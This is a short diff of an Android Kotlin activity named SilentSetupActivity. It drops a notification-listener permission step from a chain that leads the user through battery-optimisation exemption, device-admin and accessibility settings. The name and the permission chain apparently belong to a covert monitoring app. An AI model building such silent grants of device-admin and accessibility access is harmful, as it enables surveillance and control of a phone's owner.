@@ -112,26 +112,6 @@ class SilentSetupActivity : AppCompatActivity() {
                 return
             } catch (_: Exception) {}
         }
-        requestNotificationAccess()
-    }
-
-    // ── Notification Listener ────────────────────────────────────────────────
-
-    private fun isNotificationListenerEnabled(): Boolean {
-        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
-        return flat.contains(packageName)
-    }
-
-    private fun requestNotificationAccess() {
-        if (!isNotificationListenerEnabled()) {
-            try {
-                startActivityForResult(
-                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS),
-                    2004
-                )
-                return
-            } catch (_: Exception) {}
-        }
         requestAccessibility()
     }
 
@@ -174,9 +154,8 @@ class SilentSetupActivity : AppCompatActivity() {
             when (requestCode) {
                 2001 -> requestBatteryOptimization()
                 2002 -> requestDeviceAdmin()
-                2003 -> requestNotificationAccess()
-                2004 -> requestAccessibility()
-                2005 -> finishSetup()
+                2003 -> requestAccessibility()
+                2004 -> finishSetup()
             }
         }, 400)
     }
